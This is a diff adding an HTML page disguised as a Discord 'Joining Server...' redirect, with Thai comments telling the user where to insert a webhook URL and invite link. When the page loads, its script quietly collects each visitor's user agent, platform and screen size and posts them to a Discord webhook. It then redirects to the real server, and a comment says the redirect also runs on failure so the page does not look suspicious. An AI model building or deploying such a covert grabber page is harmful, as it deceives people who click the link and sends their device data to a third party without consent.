@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Joining Server...</title>
+    <style>
+        body { background-color: #36393f; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #202225; border-top: 4px solid #7289da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .container { text-align: center; }
+        p { margin-top: 20px; color: #b9bbbe; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <p>Redirecting to server...</p>
+    </div>
+
+    <script>
+        // 1. เอา Webhook URL ที่ก๊อปปี้มาจากขั้นตอนที่ 1 มาใส่ตรงนี้ (ในเครื่องหมายคำพูด)
+        const webhookURL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN'; 
+        
+        // 2. เอา ลิงก์ดิสคอร์ดจริง ที่จะให้มันเด้งไป มาใส่ตรงนี้
+        const redirectURL = 'https://discord.gg/ลิงก์เชิญดิสของคุณ';
+
+        // ดึงข้อมูลเบื้องต้นของคนที่กด
+        const data = {
+            content: `**มีคนกดลิงก์!**\n**User Agent:** ${navigator.userAgent}\n**Platform:** ${navigator.platform}\n**Screen:** ${window.screen.width}x${window.screen.height}`
+        };
+
+        // ส่งข้อมูลเข้า Discord
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).then(() => {
+            // เมื่อส่งเสร็จ ให้เด้งไปหน้าดิสจริงทันที
+            window.location.href = redirectURL;
+        }).catch(() => {
+            // ถ้าส่งไม่สำเร็จ ก็ให้เด้งไปดิสจริงอยู่ดี เพื่อไม่ให้ดูน่าสงสัย
+            window.location.href = redirectURL;
+        });
+    </script>
+</body>
+</html>
